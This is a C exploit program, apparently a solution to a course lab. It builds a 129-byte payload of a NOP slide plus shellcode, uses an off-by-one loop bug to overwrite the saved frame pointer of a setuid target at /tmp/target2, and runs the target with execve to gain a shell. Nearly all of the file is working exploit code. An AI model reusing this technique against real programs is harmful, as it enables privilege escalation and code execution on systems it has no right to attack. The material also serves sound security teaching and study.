#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target2"
#define DEFAULT_OUTPUT "/tmp/xploit2_output"

int main(int argc, char *argv[])
{
  // Determine size of exploit
  // As we have "int i = 0; i <= len; i++" in the target2.c,
  // so we can add 1 more byte to overwrite the saved RBP.
  char exploit[129];

  // Fill exploit buffer with NOP slide
  // As we have NOP slide, we can just put the shellcode
  // inside the exploit string. Then set the last byte of
  // exploit string to another value to ruin the rbp.
  // After we ruin the rbp, the rip of foo() would point to
  // the local var of main() where contains our shellcode.
  memset(exploit, '\x90', sizeof(exploit));
  memcpy(exploit + 10, shellcode, sizeof(shellcode) - 1);
  *(exploit + 128) = 0x00;

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
